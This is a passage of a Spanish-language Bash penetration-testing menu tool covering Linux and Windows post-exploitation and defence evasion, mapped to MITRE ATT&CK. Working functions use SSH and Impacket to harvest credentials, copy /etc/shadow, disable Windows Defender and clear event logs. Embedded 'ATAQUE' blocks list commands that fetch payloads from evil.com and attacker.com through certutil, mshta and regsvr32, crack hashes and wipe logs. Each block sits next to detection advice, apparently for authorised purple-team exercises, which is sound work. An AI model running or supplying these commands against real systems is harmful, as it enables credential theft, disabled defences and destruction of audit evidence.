                        echo -e "${YELLOW}🔍 Recopilando datos de Active Directory con bloodhound-python...${NC}"
                        local output
                        output=$(bloodhound-python -u "$win_user" -p "$win_pass" -d "$domain_name" -dc "$win_host" -c All 2>&1)
                        echo "$output"
                        save_output "[WIN POST-EXP T1018 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1018" "Remote System Discovery (BloodHound)"
                    fi
                fi
                ;;
            7) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
        echo ""
        read -p "↵ Enter para continuar..." _
    done
}

declare -A LINUX_DATA
LINUX_DATA[1]="🔴 ATAQUE:
  • ssh root@TARGET \"cat ~/.bash_history\"
  • ssh root@TARGET \"grep -i 'pass\|secret\|key\|token\|aws\|api' ~/.bash_history\"
  • ssh root@TARGET \"find / -name '.bash_history' 2>/dev/null | xargs grep -l 'pass'\"
  • ssh root@TARGET \"history | grep -i 'mysql\|psql\|ssh.*@\|curl.*-u'\"
|||
🔵 DEFENSA:  HISTCONTROL=ignorespace | HISTFILE=/dev/null
|||
🟣 DETECCIÓN:  auditd regla: -a always,exit -F path=~/.bash_history"

LINUX_DATA[2]="🔴 ATAQUE:
  • ssh root@TARGET \"grep -rn 'password\|passwd\|secret\|token' /etc/ 2>/dev/null\"
  • ssh root@TARGET \"find / -name 'wp-config.php' -o -name '.env' -o -name 'database.yml' 2>/dev/null\"
  • ssh root@TARGET \"cat /etc/mysql/debian.cnf\"
  • ssh root@TARGET \"find / -name '*.conf' -exec grep -l 'password' {} \\;\"
|||
🔵 DEFENSA:  Vault/secrets manager, permisos 600 en config files
|||
🟣 DETECCIÓN:  inotifywait en archivos sensibles, auditd"

LINUX_DATA[3]="🔴 ATAQUE:
  • ssh root@TARGET \"find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null\"
  • scp root@TARGET:~/.ssh/id_rsa ./id_rsa_TARGET
  • ssh root@TARGET \"cat ~/.ssh/authorized_keys\"
  • ssh-keygen -y -f ./id_rsa_TARGET  (extraer clave pública para verificar)
|||
🔵 DEFENSA:  SSH keys protegidas con passphrase + ssh-agent
|||
🟣 DETECCIÓN:  auditd: acceso a archivos .ssh/ fuera del owner"

LINUX_DATA[4]="🔴 ATAQUE:
  • ssh user@TARGET \"sudo -l\"
  • ssh root@TARGET \"cat /etc/sudoers\"
  • ssh user@TARGET \"sudo -u root /bin/bash\"
  • ssh user@TARGET \"pt-copy-sudo-token [PID_of_sudo_session]\"
|||
🔵 DEFENSA:  timestamp_timeout=0 en sudoers, PAM lockout
|||
🟣 DETECCIÓN:  Event sudo: nuevas sesiones con usuario diferente"

LINUX_DATA[5]="🔴 ATAQUE:
  • scp root@TARGET:/etc/passwd ./passwd_TARGET
  • scp root@TARGET:/etc/shadow ./shadow_TARGET
  • unshadow passwd_TARGET shadow_TARGET > combined_TARGET.txt
  • john --wordlist=rockyou.txt combined_TARGET.txt
  • hashcat -m 1800 combined_TARGET.txt rockyou.txt
|||
🔵 DEFENSA:  PAM: lock after 5 fails, shadow perms 640
|||
🟣 DETECCIÓN:  auditd: -w /etc/shadow -p rwa"

LINUX_DATA[6]="🔴 ATAQUE:
  • ssh root@TARGET \"find / -perm -4000 2>/dev/null\"
  • ssh root@TARGET \"find / -writable -type f 2>/dev/null | grep -v proc\"
  • ssh root@TARGET \"ls -la /home/*/.ssh/\"
  • ssh root@TARGET \"find /var/www -name '*.php' | xargs grep 'password'\"
  • ssh root@TARGET \"ls /opt /srv /data /backup 2>/dev/null\"
|||
🔵 DEFENSA:  Auditoría de SUID binaries, permisos mínimos
|||
🟣 DETECCIÓN:  auditd: find y locate agresivos en filesystem"

_prompt_ssh_creds() {
    local default_target="${TARGET:-localhost}"
    read -p "🎯 Host / IP objetivo SSH [default: $default_target]: " ssh_host
    ssh_host="${ssh_host:-$default_target}"
    read -p "👤 Usuario SSH [default: root]: " ssh_user
    ssh_user="${ssh_user:-root}"
    read -p "🔌 Puerto SSH [default: 22]: " ssh_port
    ssh_port="${ssh_port:-22}"
    read -p "🔑 Ruta a clave privada SSH (dejar en blanco para usar password/agent): " ssh_key

    SSH_CMD_BASE="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p $ssh_port"
    SCP_CMD_BASE="scp -P $ssh_port -o StrictHostKeyChecking=no -o ConnectTimeout=5"
    if [ -n "$ssh_key" ]; then
        SSH_CMD_BASE="$SSH_CMD_BASE -i $ssh_key"
        SCP_CMD_BASE="$SCP_CMD_BASE -i $ssh_key"
    fi
    SSH_TARGET_STR="${ssh_user}@${ssh_host}"
}

post_explotacion_linux() {
    while true; do
        show_banner
        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║       ${YELLOW}🐧 POST-EXPLOTACIÓN — LINUX (REAL)${NC}         ${RED}║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "1. T1552.003 — Credentials in Bash History"
        echo "2. T1552.002 — Credentials in Files (config files)"
        echo "3. T1552.004 — Private SSH Keys"
        echo "4. T1548.003 — Sudo Token Impersonation (sudo -l / permissions)"
        echo "5. T1003.008 — Exfiltrar /etc/passwd & /etc/shadow"
        echo "6. T1083 — Enumeración de directorios y binarios SUID"
        echo "7. Volver"
        echo ""
        read -p "💣 Selecciona [1-7]: " op
        case $op in
            1)
                _prompt_ssh_creds
                if confirm_risk "Credentials in Bash History ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
                    if check_command ssh "sudo apt install openssh-client"; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando inspección de historial bash en $SSH_TARGET_STR...${NC}"
                        local output
                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "cat ~/.bash_history 2>/dev/null; grep -i -E 'pass|secret|key|token|aws|api' ~/.bash_history 2>/dev/null" 2>&1)
                        echo "$output"
                        save_output "[LINUX POST-EXP T1552.003 $SSH_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1552.003" "Credentials in Bash History"
                    fi
                fi
                ;;
            2)
                _prompt_ssh_creds
                if confirm_risk "Credentials in Files ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
                    if check_command ssh "sudo apt install openssh-client"; then
                        echo ""
                        echo -e "${YELLOW}🔍 Buscando archivos de configuración con credenciales en $SSH_TARGET_STR...${NC}"
                        local output
                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "grep -rn -E 'password|passwd|secret|token' /etc/ 2>/dev/null | head -n 30; find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null | head -n 20" 2>&1)
                        echo "$output"
                        save_output "[LINUX POST-EXP T1552.002 $SSH_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1552.002" "Credentials in Files"
                    fi
                fi
                ;;
            3)
                _prompt_ssh_creds
                if confirm_risk "Private SSH Keys Discovery ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
                    if check_command ssh "sudo apt install openssh-client"; then
                        echo ""
                        echo -e "${YELLOW}🔍 Buscando llaves SSH privadas en $SSH_TARGET_STR...${NC}"
                        local output
                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null" 2>&1)
                        echo "$output"
                        save_output "[LINUX POST-EXP T1552.004 $SSH_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1552.004" "Private SSH Keys"
                    fi
                fi
                ;;
            4)
                _prompt_ssh_creds
                if confirm_risk "Sudo Privilege Check ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
                    if check_command ssh "sudo apt install openssh-client"; then
                        echo ""
                        echo -e "${YELLOW}🔍 Verificando privilegios sudo en $SSH_TARGET_STR...${NC}"
                        local output
                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "sudo -n -l 2>&1; cat /etc/sudoers 2>/dev/null | grep -v '^#'" 2>&1)
                        echo "$output"
                        save_output "[LINUX POST-EXP T1548.003 $SSH_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1548.003" "Sudo Token Impersonation"
                    fi
                fi
                ;;
            5)
                _prompt_ssh_creds
                if confirm_risk "Dump /etc/passwd & /etc/shadow ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
                    if check_command scp "sudo apt install openssh-client"; then
                        echo ""
                        echo -e "${YELLOW}🔍 Descargando /etc/passwd y /etc/shadow desde $SSH_TARGET_STR...${NC}"
                        local local_dir="loot_${ssh_host}_$(date +%s)"
                        mkdir -p "$local_dir"
                        $SCP_CMD_BASE "$SSH_TARGET_STR:/etc/passwd" "$local_dir/passwd" 2>/dev/null
                        $SCP_CMD_BASE "$SSH_TARGET_STR:/etc/shadow" "$local_dir/shadow" 2>/dev/null
                        if [ -f "$local_dir/passwd" ]; then
                            echo -e "${GREEN}✅ /etc/passwd descargado en $local_dir/passwd${NC}"
                        fi
                        if [ -f "$local_dir/shadow" ]; then
                            echo -e "${GREEN}✅ /etc/shadow descargado en $local_dir/shadow${NC}"
                        fi
                        save_output "[LINUX POST-EXP T1003.008 $SSH_TARGET_STR]\nArchivos descargados en $local_dir"
                        type track_technique &>/dev/null && track_technique "T1003.008" "/etc/passwd y /etc/shadow"
                    fi
                fi
                ;;
            6)
                _prompt_ssh_creds
                if confirm_risk "File & Directory Discovery ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
                    if check_command ssh "sudo apt install openssh-client"; then
                        echo ""
                        echo -e "${YELLOW}🔍 Enumerando binarios SUID y directorios escribibles en $SSH_TARGET_STR...${NC}"
                        local output
                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "echo '=== BINARIOS SUID ==='; find / -perm -4000 2>/dev/null | head -n 30; echo '=== DIRECTORIOS SENSIBLES ==='; ls -la /opt /srv /data /backup 2>/dev/null" 2>&1)
                        echo "$output"
                        save_output "[LINUX POST-EXP T1083 $SSH_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1083" "File and Directory Discovery"
                    fi
                fi
                ;;
            7) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
        echo ""
        read -p "↵ Enter para continuar..." _
    done
}

declare -A EVASION_DATA
EVASION_DATA[1]="🔴 TÉCNICAS en Windows TARGET:
  • psexec.py user:pass@TARGET \"powershell -enc [base64_payload]\"
  • wmiexec.py user:pass@TARGET \"powershell -ep bypass -c Invoke-Obfuscation Token\\All\\1\"
  • evil-winrm -i TARGET -u Admin -p Pass -s obfuscated_script.ps1
  • String concatenation: \$c='I'+'EX'; &(\$c) payload_for_TARGET
  • Chameleon PowerShell: generar script camuflado y usar en TARGET
|||
🔵 DETECCIÓN en TARGET:
  • PowerShell Script Block Logging (Event 4104) → decodifica el payload en Event Viewer de TARGET
  • AMSI: intercepta antes de ejecutar incluso código decodificado
  • Buscar -enc, IEX, DownloadString, base64 en logs de PowerShell"

EVASION_DATA[2]="🔴 TÉCNICAS en TARGET:
  • Psexec / Meterpreter a TARGET → meterpreter> execute -f svchost.exe -a '-k netsvcs' -H
  • Shellcode: inyectar payload.bin en memoria vía CreateRemoteThread en proceso de TARGET
  • Process Hollowing: SpawnProcess en Winlogon en TARGET suspendido → Replace code
  • Reflective DLL: meterpreter> load incognito (o cargar DLL directo en memoria de TARGET sin disco)
  • wmic /node:TARGET process call create \"C:\\payload_injector.exe\"
|||
🔵 DETECCIÓN en TARGET:
  • Sysmon Event 8: CreateRemoteThread
  • Sysmon Event 25: ProcessTampering (Process Hollowing)
  • Memoria RWX en proceso legítimo sin mapear a fichero
  • EDR: comportamiento anómalo en proceso → código en heap"

EVASION_DATA[3]="🔴 TÉCNICAS en TARGET:
  • psexec.py admin:pass@TARGET \"powershell Set-MpPreference -DisableRealtimeMonitoring \$true\"
  • wmiexec.py admin:pass@TARGET \"sc stop WinDefend && sc config WinDefend start=disabled\"
  • evil-winrm -i TARGET -u admin -p pass → BYOVD: traer driver vulnerable para kill EDR desde kernel
  • wmic /node:TARGET path MSFT_MpPreference call Add ExclusionPath='C:\\temp'
  • psexec.py admin@TARGET \"taskkill /F /IM MsMpEng.exe\"
|||
🔵 DETECCIÓN en TARGET:
  • Tamper Protection (Microsoft Defender) → bloquea cambios
  • Event ID 7036: servicio WinDefend detenido → alerta inmediata
  • EDR heartbeat: si el agente en TARGET deja de reportar → alerta
  • Alertar drivers cargados no firmados por Microsoft"

EVASION_DATA[4]="🔴 LOLBINS descargados/ejecutados en TARGET:
  • certutil.exe en TARGET:
    wmic /node:TARGET process call create \"certutil -urlcache -split -f http://evil.com/sh.exe C:\\temp\\sh.exe\"
  • mshta.exe en TARGET:
    psexec.py admin@TARGET \"mshta.exe http://attacker.com/payload.hta\"
  • regsvr32.exe CargarDLL/COM sin previo registro en TARGET:
    evil-winrm -i TARGET → regsvr32 /s /u /i:http://attacker.com/pay.sct scrobj.dll
  • msiexec.exe: instalar MSI remoto: msiexec /q /i http://evil.com/TARGET_payload.msi
|||
🔵 DETECCIÓN en TARGET:
  • WDAC / AppLocker: bloquear certutil para descargas
  • Alertar en: certutil -urlcache, mshta con URL, regsvr32 /i:http
  • Sysmon ID 1: argumento de red en procesos 'legítimos'"

EVASION_DATA[5]="🔴 TÉCNICAS de borrado en TARGET:
  • psexec.py admin@TARGET \"wevtutil cl Security; wevtutil cl System; wevtutil cl Application\"
  • evil-winrm -i TARGET → Clear-EventLog -LogName Security,System
  • ssh root@TARGET \"> /var/log/auth.log; history -c; shred -u ~/.bash_history\"
  • wmic /node:TARGET process call create \"sc stop Sysmon\"
|||
🔵 DETECCIÓN en TARGET:
  • Event ID 1102: Audit log cleared → alerta inmediata enviada a SIEM
  • Event ID 7036: Sysmon detenido en TARGET
  • SIEM externo: si TARGET deja de recibir logs del host → alerta inmediata
  • WORM logs: escribir en repositorio externo inmutable"

EVASION_DATA[6]="🔴 TÉCNICAS en TARGET:
  • Renombrar malware como svchost.exe y transferir a TARGET
  • smbclient //TARGET/C$ → Poner malware en C:\\Windows\\System32\\svchost.exe
  • Unicode homoglifos: invocar svсhost.exe en TARGET (с cirílico vs c latino)
  • DLL Side-Loading: colocar DLL maliciosa junto a app legítima en TARGET
|||
🔵 DETECCIÓN en TARGET:
  • Verificar firma digital de todos los ejecutables en System32
  • Sysmon ID 1: path de proceso vs. path esperado del ejecutable
  • Alertar en: procesos que se llaman svchost.exe fuera de System32 en TARGET"

evasion_defensas() {
    while true; do
        show_banner
        echo -e "${YELLOW}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║        ${RED}🕵️  EVASIÓN DE DEFENSAS (REAL)${NC}            ${YELLOW}║${NC}"
        echo -e "${YELLOW}║     ${CYAN}Defense Evasion — TA0005 MITRE${NC}            ${YELLOW}║${NC}"
        echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "1. T1027.010 — Ofuscación de comandos (PowerShell / Base64)"
        echo "2. T1055     — Process Injection (Creación remota de proceso)"
        echo "3. T1562.001 — Deshabilitar AV/EDR (Set-MpPreference)"
        echo "4. T1218     — LoLBins (Certutil / Mshta / Regsvr32)"
        echo "5. T1070.004 — Indicador Removal: Borrar Logs (wevtutil / Clear-EventLog)"
        echo "6. T1036     — Masquerading (Suplantación de procesos)"
        echo "7. Volver"
        echo ""
        read -p "🕵️  Selecciona [1-7]: " op
        case $op in
            1)
                _prompt_win_creds
                if confirm_risk "PowerShell Obfuscation Command ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-wmiexec &>/dev/null; then
                        cmd_tool="impacket-wmiexec"
                    elif command -v wmiexec.py &>/dev/null; then
                        cmd_tool="wmiexec.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando comando PowerShell ofuscado Base64 en $WIN_TARGET_STR...${NC}"
                        local b64_cmd="cG93ZXJzaGVsbCAtTm9QIC1Ob2NsaWVudCAtYyAiV3JpdGUtSG9zdCAnSEFDWEdQVCBPQkZVU0NBVEVEIEVWRU5UJyI="
                        local output
                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "powershell -EncodedCommand $b64_cmd" 2>&1)
                        echo "$output"
                        save_output "[EVASION T1027.010 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1027.010" "Obfuscated Files or Information: PowerShell"
                    else
                        echo -e "${RED}❌ impacket-wmiexec no está instalado.${NC}"
                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
                    fi
                fi
                ;;
            2)
                _prompt_win_creds
                if confirm_risk "Process Injection Remote Command ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-psexec &>/dev/null; then
                        cmd_tool="impacket-psexec"
                    elif command -v psexec.py &>/dev/null; then
                        cmd_tool="psexec.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Probando inyección/ejecución remota en servicio con $cmd_tool en $WIN_TARGET_STR...${NC}"
                        local output
                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "cmd /c whoami /priv" 2>&1)
                        echo "$output"
                        save_output "[EVASION T1055 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1055" "Process Injection"
                    else
                        echo -e "${RED}❌ impacket-psexec no está disponible.${NC}"
                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
                    fi
                fi
                ;;
            3)
                _prompt_win_creds
                echo -e "${RED}⚠️  [ADVERTENCIA EXPLÍCITA EDR/AV]: Deshabilitar monitoreo en tiempo real genera alertas críticas e interrumpe protecciones EDR.${NC}"
                if confirm_risk "Deshabilitar AV/EDR - Set-MpPreference ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-wmiexec &>/dev/null; then
                        cmd_tool="impacket-wmiexec"
                    elif command -v wmiexec.py &>/dev/null; then
                        cmd_tool="wmiexec.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Intentando deshabilitar monitoreo en tiempo real de Windows Defender en $WIN_TARGET_STR...${NC}"
                        local output
                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "powershell Set-MpPreference -DisableRealtimeMonitoring \$true" 2>&1)
                        echo "$output"
                        save_output "[EVASION T1562.001 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1562.001" "Impair Defenses: Disable AV/EDR"
                    else
                        echo -e "${RED}❌ impacket-wmiexec no está disponible.${NC}"
                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
                    fi
                fi
                ;;
            4)
                _prompt_win_creds
                if confirm_risk "LoLBin Proxy Execution - certutil/mshta ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-wmiexec &>/dev/null; then
                        cmd_tool="impacket-wmiexec"
                    elif command -v wmiexec.py &>/dev/null; then
                        cmd_tool="wmiexec.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando verificación LoLBin (certutil) en $WIN_TARGET_STR...${NC}"
                        local output
                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "certutil -urlcache -f http://127.0.0.1/test.txt %TEMP%\\test.txt" 2>&1)
                        echo "$output"
                        save_output "[EVASION T1218 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1218" "System Binary Proxy Execution"
                    else
                        echo -e "${RED}❌ impacket-wmiexec no está disponible.${NC}"
                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
                    fi
                fi
                ;;
            5)
                _prompt_win_creds
                echo -e "${RED}⚠️  [ADVERTENCIA CRÍTICA EDR/SIEM]: El borrado de registros de eventos (wevtutil cl) genera el Event ID 1102 en SIEM y suele desencadenar aislamiento automático de host por EDR.${NC}"
                
                # Detectar plataforma para informar al usuario sobre el comportamiento de wevtutil
                local current_plat="LINUX"
                if declare -f detect_platform >/dev/null; then
                    current_plat=$(detect_platform)
                fi
                if [[ "$current_plat" == "WSL" || "$current_plat" == "KALI" || "$current_plat" == "LINUX" || "$current_plat" == "RASPBERRY_PI" ]]; then
                    echo -e "${YELLOW}ℹ️  Plataforma local detectada: ${current_plat}. 'wevtutil' es un comando nativo de Windows y se ejecutará dinámicamente en el objetivo remoto vía Impacket.${NC}"
                fi

                if confirm_risk "Borrar Event Logs con wevtutil ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-wmiexec &>/dev/null; then
                        cmd_tool="impacket-wmiexec"
                    elif command -v wmiexec.py &>/dev/null; then
                        cmd_tool="wmiexec.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Limpiando logs Security, System y Application en $WIN_TARGET_STR...${NC}"
                        local output
                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "wevtutil cl Security && wevtutil cl System && wevtutil cl Application" 2>&1)
                        echo "$output"
                        save_output "[EVASION T1070.004 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1070.004" "Indicator Removal: Clear Windows Event Logs"
                    else
                        echo -e "${RED}❌ impacket-wmiexec no está disponible.${NC}"
                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
                    fi
                fi
                ;;
            6)
                _prompt_win_creds
                if confirm_risk "Process Masquerading Verification ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-wmiexec &>/dev/null; then
                        cmd_tool="impacket-wmiexec"
                    elif command -v wmiexec.py &>/dev/null; then
                        cmd_tool="wmiexec.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Verificando ejecuciones de procesos con nombres suplantados en $WIN_TARGET_STR...${NC}"
                        local output
                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "wmic process get ExecutablePath,Name | findstr /i /v \"system32\" | findstr /i \"svchost.exe\"" 2>&1)
                        echo "$output"
                        save_output "[EVASION T1036 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1036" "Masquerading"
                    else
                        echo -e "${RED}❌ impacket-wmiexec no está disponible.${NC}"
                        echo -e "${YELLOW}💡 Instalación:${NC} pip install impacket"
                    fi
                fi
                ;;
            7) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
        echo ""
        read -p "↵ Enter para continuar..." _
    done
}

menu_post_explotacion() {
    preguntar_objetivo || return
    while true; do
        show_banner
        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║           ${YELLOW}💣 MENÚ POST-EXPLOTACIÓN${NC}             ${RED}║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${YELLOW}1.${NC} Post-Explotación Windows (Mimikatz, Kerberoasting...)"
        echo -e "  ${YELLOW}2.${NC} Post-Explotación Linux (Bash history, SSH keys...)"
        echo -e "  ${YELLOW}3.${NC} Evasión de Defensas (LoLBins, Obfuscation, AV Bypass)"
        echo -e "  ${RED}0.${NC} Volver"
        echo ""
        read -p "💣 Selecciona [0-3]: " op
        case $op in
            1) post_explotacion_windows ;;
            2) post_explotacion_linux ;;
            3) evasion_defensas ;;
            0) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
    done
}

# ============================================================
# 12. SIMULACIÓN DE ACTORES DE AMENAZA (APT)
# ============================================================
simular_apt() {
    preguntar_objetivo || return
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║      ${RED}🕵️  SIMULACIÓN DE ACTOR DE AMENAZA${NC}          ${CYAN}║${NC}"
        echo -e "${CYAN}║       ${YELLOW}APT29 · APT38 · FIN7 · Personalizado${NC}     ${CYAN}║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${YELLOW}1.${NC} ${RED}APT29${NC} (Cozy Bear) 🇷🇺  — Espionaje SVR Ruso"
        echo -e "  ${YELLOW}2.${NC} ${RED}APT38${NC} (Lazarus)   🇰🇵 — Financiero RPDC"
        echo -e "  ${YELLOW}3.${NC} ${RED}FIN7${NC}  (Carbanak)   💰  — Criminal Financiero"
        echo -e "  ${YELLOW}4.${NC} ${BLUE}Personalizado${NC}       🎯  — Define tus técnicas"
        echo -e "  ${RED}0.${NC} Volver"
        echo ""
        read -p "🕵️  Selecciona APT [0-4]: " sel

        case $sel in
            1) _show_apt "APT29" ;;
            2) _show_apt "APT38" ;;
            3) _show_apt "FIN7" ;;
            4) _apt_personalizado ;;
            0) return ;;
            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
        esac
        echo ""
        read -p "↵ Enter para continuar..." _
    done
}

_show_apt() {
    local apt="$1"
    local info="${APT_INFO[$apt]}"
    local tecnicas="${APT_TECNICAS[$apt]}"
    local aperturndata="${APT_DATA[$apt]}"

    echo ""
    echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ${CYAN}🕵️  PERFIL: $apt contra ${TARGET}${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    IFS='|' read -ra info_parts <<< "$info"
    echo -e "  ${YELLOW}Alias:${NC}       ${info_parts[0]}"
    echo -e "  ${YELLOW}Atribución:${NC}  ${info_parts[1]}"
    echo -e "  ${YELLOW}Motivación:${NC}  ${info_parts[2]}"
    echo -e "  ${YELLOW}Objetivo:${NC}    ${info_parts[3]}"
    echo ""
    echo -e "${PURPLE}══ KILL CHAIN ════════════════════════════════════${NC}"
    
    local parsed_text="${aperturndata//TARGET/$TARGET}"

    local temp="$parsed_text"
    local delimiter="|||"
    local pasos=()
    while [[ "$temp" == *"$delimiter"* ]]; do
        pasos+=("${temp%%"$delimiter"*}")
        temp="${temp#*"$delimiter"}"
    done
    pasos+=("$temp")

    for paso in "${pasos[@]}"; do
        paso="$(echo -e "$paso" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
        [[ -z "$paso" ]] && continue
        
        # Resaltamos el primer título (la técnica MITRE)
        local tecnica=$(echo "$paso" | head -n 1)
        local rest=$(echo "$paso" | tail -n +2)
        
        echo -e "  ${GREEN}➤${NC} ${CYAN}$tecnica${NC}"
        if [[ -n "$rest" ]]; then
            echo -e "$rest" | sed 's/^/      /'
        fi
        echo ""
    done
    echo -e "${CYAN}══ TÉCNICAS MITRE ATT&CK ════════════════════════${NC}"
    IFS='|' read -ra tecs <<< "$tecnicas"
    for tec in "${tecs[@]}"; do
        local tid="${tec%%:*}"
        local tnom="${tec##*:}"
        printf "  ${YELLOW}%-14s${NC} %s\n" "$tid" "$tnom"
    done
    echo ""
    echo -e "${YELLOW}══ EVALUACIÓN DE COBERTURA ══════════════════════${NC}"
    echo -e "  ¿Tienes defensa contra estas técnicas?"
    echo ""
    IFS='|' read -ra tecs2 <<< "$tecnicas"
    local cubierto=0
    local total=${#tecs2[@]}
    for tec in "${tecs2[@]}"; do
        local tid="${tec%%:*}"
        read -p "  ¿Detectarías/mitigarías ${CYAN}$tid${NC}? [s/n]: " resp
        if [[ "${resp,,}" == "s" ]]; then
            echo -e "    ${GREEN}✅ Cubierta${NC}"
            ((cubierto++))
        else
            echo -e "    ${RED}❌ BRECHA detectada → revisar controles${NC}"
        fi
    done
    echo ""
    local pct=$(( cubierto * 100 / total ))
    echo -e "${CYAN}══ RESULTADO ════════════════════════════════════${NC}"
    echo -e "  Cobertura: ${GREEN}$cubierto${NC} / $total técnicas (${YELLOW}$pct%${NC})"
    if (( pct >= 70 )); then
        echo -e "  ${GREEN}✅ Postura defensiva BUENA frente a $apt${NC}"
    elif (( pct >= 40 )); then
        echo -e "  ${YELLOW}⚠️  Postura MEJORABLE — brechas significativas${NC}"
    else
        echo -e "  ${RED}🚨 Postura CRÍTICA — expuesto a $apt${NC}"
    fi
    save_output "[$apt SIMULACION] Cobertura: $cubierto/$total ($pct%)"
}

_apt_personalizado() {
    echo ""
    echo -e "${BLUE}╔══ APT PERSONALIZADO ═══════════════════════════╗${NC}"
    echo -e "  Ingresa los IDs de técnicas MITRE separadas por coma"
    echo -e "  Ejemplo: ${YELLOW}T1566,T1059,T1078,T1003${NC}"
    echo ""
    read -p "🎯 Tus técnicas: " custom_input

    IFS=',' read -ra custom_tecs <<< "$custom_input"
    local cubierto=0
    local total=${#custom_tecs[@]}

    echo ""
    echo -e "${YELLOW}══ EVALUACIÓN PERSONALIZADA ══════════════════════${NC}"
    for tid in "${custom_tecs[@]}"; do
        tid="${tid// /}"
        local pdata="${PURPLE_DATA[${tid^^}]}"
        echo ""
        echo -e "  ${CYAN}Técnica: ${tid^^}${NC}"
        if [[ -n "$pdata" ]]; then
            # Mostrar solo línea de ataque
            local pmod="${pdata//TARGET/$TARGET}"
            
            local temp="$pmod"
            local delimiter="|||"
            local secciones=()
            while [[ "$temp" == *"$delimiter"* ]]; do
                secciones+=("${temp%%"$delimiter"*}")
                temp="${temp#*"$delimiter"}"
            done
            secciones+=("$temp")
            
            for s in "${secciones[@]}"; do
                if [[ "$s" == *"🔴"* ]]; then
                    echo "$s" | head -5 | sed 's/^/  /'
                    break
                fi
            done
        fi
        read -p "  ¿Detectarías/mitigarías esta técnica? [s/n]: " resp
        if [[ "${resp,,}" == "s" ]]; then
